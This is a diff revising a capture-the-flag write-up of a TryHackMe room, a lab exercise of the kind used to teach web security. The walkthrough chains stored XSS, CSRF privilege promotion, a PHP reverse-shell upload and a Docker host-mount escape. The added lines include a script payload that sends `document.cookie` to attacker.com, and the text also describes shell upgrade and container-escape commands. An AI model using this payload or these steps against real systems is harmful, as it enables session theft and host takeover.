@@ -5,22 +5,7 @@
 > **Scope:** TryHackMe lab environment  
 > **Objective:** Chain the discovered web vulnerabilities to retrieve all three flags.
 
-This write-up documents my route through the room, including the ideas I tested, the steps that worked, and what I learned while researching the Docker stage. Screenshots are included beside the relevant steps.
-
-## Table of Contents
-
-1. [Initial Setup](#1-initial-setup)
-2. [Port and Web Enumeration](#2-port-and-web-enumeration)
-3. [Finding the Leaked Email](#3-finding-the-leaked-email)
-4. [Stored XSS and Moderator Session](#4-stored-xss-and-moderator-session)
-5. [Understanding the Promotion Token](#5-understanding-the-promotion-token)
-6. [Promoting the Moderator to Admin](#6-promoting-the-moderator-to-admin)
-7. [Accessing the Finance Feature](#7-accessing-the-finance-feature)
-8. [File Upload and Reverse Shell](#8-file-upload-and-reverse-shell)
-9. [Understanding the Docker Escape](#9-understanding-the-docker-escape)
-10. [Attack Chain Summary](#10-attack-chain-summary)
-11. [Tools Used](#11-tools-used)
-12. [What I Learned and Technical Notes](#12-what-i-learned-and-technical-notes)
+This write-up documents my route through the room, including the ideas I tested, the steps that worked, and what I learned while researching. Screenshots are included beside the relevant steps.
 
 ---
 
@@ -38,7 +23,7 @@ Add the following entry, replacing `<TARGET_IP>` with the IP address assigned to
 <TARGET_IP> review.thm
 ```
 
-I then opened the site using `http://review.thm`.
+Now i can open the site using `http://review.thm`.
 
 ## 2. Port and Web Enumeration
 
@@ -61,21 +46,9 @@ One important finding was that the `PHPSESSID` cookie did **not** have the `Http
 
 I also ran directory enumeration with Gobuster. One particularly useful discovery was `/mail/dump.txt`.
 
-![Directory enumeration output](screenshots/sequence-6.png)
+### Finding the Leaked Email
 
-### Website review
-
-The website had a login page and a Contact Us page. I checked the pages and their source, but did not notice an obvious issue at that point. I tried common credentials on the login page, but they did not work, so I continued investigating the contact form.
-
-![Review Shop landing page](screenshots/sequence-2.png)
-
-![Login page](screenshots/sequence-3.png)
-
-![Contact form](screenshots/sequence-4.png)
-
-## 3. Finding the Leaked Email
-
-The file `/mail/dump.txt` contained an email describing the internal Finance and Lottery features. It also disclosed the password required to access the Finance feature. The password recorded in public walkthroughs is `S60u}f5j`; check it against the value shown in your own active room instance.
+The file `/mail/dump.txt` contained an email describing the internal Finance and Lottery features. It also disclosed the password required to access the Finance feature. 
 
 The important details were:
 
@@ -87,7 +60,17 @@ I saved these details for later because the features were not directly available
 
 ![Email dump with internal feature details](screenshots/sequence-10.png)
 
-## 4. Stored XSS and Moderator Session
+### Website review
+
+The website had a login page and a Contact Us page. I checked the pages and their source codes, but did not notice an obvious issue at that point. I tried common credentials on the login page, but they did not work, so I continued investigating the contact form.
+
+![Review Shop landing page](screenshots/sequence-2.png)
+
+![Login page](screenshots/sequence-3.png)
+
+![Contact form](screenshots/sequence-4.png)
+
+## 3. Stored XSS and Moderator Session
 
 I submitted a normal message through the Contact Us form. After submission, the page indicated that someone would review the message.
 
@@ -98,15 +81,14 @@ At this point, I connected two observations:
 
 This led me to test for **stored cross-site scripting (XSS)** and determine whether JavaScript running in the reviewer's browser could read the session cookie.
 
-I submitted a cookie-exfiltration payload that sent `document.cookie` to my listener. When the submitted message was reviewed, I received the moderator's session cookie. I then replaced my own `PHPSESSID` value with the captured value and refreshed the application.
+I submitted a cookie-exfiltration payload that sent `document.cookie` to my listener. When the submitted message was reviewed, I received the moderator's session
+cookie. I then replaced my own `PHPSESSID` value with the captured value and refreshed the application.
 
-> **Important distinction:** `HttpOnly` being absent does not create XSS by itself. It means JavaScript can read the cookie if script execution is possible in the page. The stored XSS was the mechanism that made the cookie theft possible.
+Used xss payload - `<script>fetch('http://attacker.com/file?cookie='+document.cookie)</script>`
 
 ![Contact form after message submission](screenshots/sequence-5.png)
 
-The callback reached my listener, confirming that the browser had sent the cookie data. I used the captured session value in my browser.
-
-![Listener received the callback](screenshots/sequence-15.png)
+![Listener received the callback](screenshots/sequence-6.png)
 
 After replacing my session cookie, I reached the moderator dashboard and retrieved the **first flag**.
 
@@ -116,7 +98,7 @@ The dashboard exposed additional functionality, including Settings and Chat. I o
 
 ![Moderator settings panel](screenshots/sequence-8.png)
 
-## 5. Understanding the Promotion Token
+## 4. Understanding the Promotion Token
 
 The Settings page included a feature for promoting a user to co-admin. The promotion action was restricted to an administrator in the interface, so I examined how the request worked.
 
@@ -139,15 +121,13 @@ For example, the MD5 hash of `admin` is:
 21232f297a57a5a743894a0e4a801fc3
 ```
 
-I used a hash generator / hash-checking tools on Windows to verify the value. The key issue was that the token was predictable because it was derived from a known username, rather than being a random, session-bound CSRF token.
-
-![Promotion request / application source inspection](screenshots/sequence-12.png)
+I used hashcat tool on Windows to verify the value. The key issue was that the token was predictable because it was derived from a known username, rather than being a random, session-bound CSRF token.
 
 ![Hashcat confirmed the MD5 token for mod](screenshots/hashcat-md5-token.png)
 
 ![MD5 value check for admin](screenshots/sequence-14.png)
 
-## 6. Promoting the Moderator to Admin
+## 5. Promoting the Moderator to Admin
 
 I next explored the Chat feature. A straightforward XSS payload was blocked by the application, so I tried a different approach: sending a link that the administrator would open.
 
@@ -169,19 +149,15 @@ The idea was to make the administrator's authenticated browser visit the state-c
 </html>
 ```
 
-The same payload is included in [`promote.html`](promote.html). I hosted the page and sent its link through Chat. When the administrator opened the link, their browser followed the redirect to the promotion endpoint while authenticated to `review.thm`.
+I hosted the page and sent its link through Chat. When the administrator opened the link, their browser followed the redirect to the promotion endpoint while authenticated to `review.thm`.
 
 The request promoted `mod` to admin. I then returned to the dashboard and confirmed that the role change had taken effect. This gave me access to the **second flag**.
-
-![Chat feature](screenshots/sequence-9.png)
-
-![Request details in the proxy](screenshots/sequence-17.png)
 
 ![Dashboard after the role change](screenshots/sequence-16.png)
 
 > **Why this worked:** The promotion endpoint changed account privileges through a GET request, and the CSRF token was predictable. A request that changes state should not be implemented as a simple GET action, and a CSRF token should be unpredictable and bound to the user's session.
 
-## 7. Accessing the Finance Feature
+## 6. Accessing the Finance Feature
 
 After obtaining admin access, I explored the dashboard and noticed the Lottery feature. The email found earlier mentioned a separate Finance feature, so I intercepted the request generated when selecting Lottery.
 
@@ -197,21 +173,23 @@ to:
 finance.php
 ```
 
+![Request details in the proxy](screenshots/sequence-17.png)
+
 This caused the application to load the Finance feature instead of Lottery. The panel requested the password disclosed in `/mail/dump.txt`; after entering it, I gained access to the Finance page and its file-upload functionality.
 
 ![Finance panel and upload feature](screenshots/sequence-18.png)
 
-![Intercepted request with the feature parameter changed](screenshots/sequence-19.png)
-
-## 8. File Upload and Reverse Shell
+## 7. File Upload and Reverse Shell
 
 I uploaded a normal file first and observed where the application stored uploaded files. Knowing the upload location helped me plan the next step.
 
 I then prepared a PHP reverse shell, configured its callback IP address and port for my attack machine, and uploaded it through the Finance panel. I started a listener on the matching port and triggered the uploaded PHP file through the application's feature/request flow.
 
-The connection succeeded and gave me a shell as `root` **inside the Docker container**.
+The connection succeeded and gave me a shell as `root`.
 
 ![Reverse-shell setup](screenshots/sequence-20.png)
+
+![Reverse-shell-execution](screenshots/sequence-19.png)
 
 ![Shell obtained from the uploaded PHP file](screenshots/sequence-21.png)
 
@@ -219,11 +197,11 @@ At first, I expected to find the final flag from this shell, but I could not loc
 
 This was the point where I needed to understand the container environment rather than continue searching only inside the current container.
 
-## 9. Understanding the Docker Escape
+## 8. Understanding the Docker Escape
 
 I had to research this stage because I was not familiar with the Docker escape technique when I first reached it. The key was that the environment allowed Docker commands to be run from inside the compromised container, and the Docker image used by the room was available locally.
 
-### 9.1 Upgrade the shell to an interactive TTY
+### 8.1 Upgrade the shell to an interactive TTY
 
 The reverse shell was not a fully interactive terminal. I used the following commands to improve terminal interaction:
 
@@ -239,7 +217,7 @@ stty raw -echo && fg
 
 After returning to the shell, I pressed `Enter` if needed.
 
-### 9.2 Start a container with the host filesystem mounted
+### 8.2 Start a container with the host filesystem mounted
 
 The commands I used are also preserved in [`cmds.txt`](cmds.txt):
 
@@ -274,20 +252,7 @@ This revealed the **third flag**, completing the room.
 
 > **Technical note:** The root cause is not necessarily a bug in a particular Docker version. Exposing Docker daemon access or its socket to a compromised container is a dangerous configuration because that access can allow container creation and host filesystem mounts. Other public walkthroughs use Docker API requests or a different image, but the underlying weakness is similar.
 
-## 10. Attack Chain Summary
-
-| Stage | Finding / technique | Result |
-|---|---|---|
-| 1 | Nmap and directory enumeration | Found exposed web service and `/mail/dump.txt` |
-| 2 | Information disclosure | Learned about internal features and obtained the Finance password |
-| 3 | Stored XSS + missing `HttpOnly` | Captured the moderator's session cookie |
-| 4 | Predictable MD5-based CSRF token | Prepared a promotion request for the moderator account |
-| 5 | Admin-triggered redirect to a state-changing GET endpoint | Promoted `mod` to admin |
-| 6 | Feature parameter tampering | Accessed the Finance panel |
-| 7 | Unrestricted / insufficiently validated file upload | Achieved code execution and a reverse shell in the container |
-| 8 | Docker access + host filesystem bind mount | Accessed the host's root flag |
-
-## 11. Tools Used
+## 9. Tools Used
 
 | Tool | Purpose |
 |---|---|
@@ -300,10 +265,8 @@ This revealed the **third flag**, completing the room.
 | **PHP reverse shell** | Obtaining a shell through the upload feature |
 | **Docker CLI** | Starting a container with the host filesystem mounted |
 
-## 12. What I Learned and Technical Notes
+## 10. What I Learned and Technical Notes
 
-- A missing `HttpOnly` cookie attribute increases the impact of XSS because JavaScript can read the cookie. It does not create the XSS vulnerability by itself.
-- A hash is not encryption. The promotion token was predictable because it matched `MD5(username)`, so testing a known username was more useful than trying to “decode” the token.
 - A state-changing GET endpoint combined with weak CSRF protection can allow an administrator's browser to perform an action simply by following a link.
 - The `feature` parameter was important because changing it exposed a feature that was not available through the normal dashboard flow.
 - A successful root shell inside a container does not automatically mean the host has been compromised. I needed to identify the container boundary and investigate how Docker was exposed.
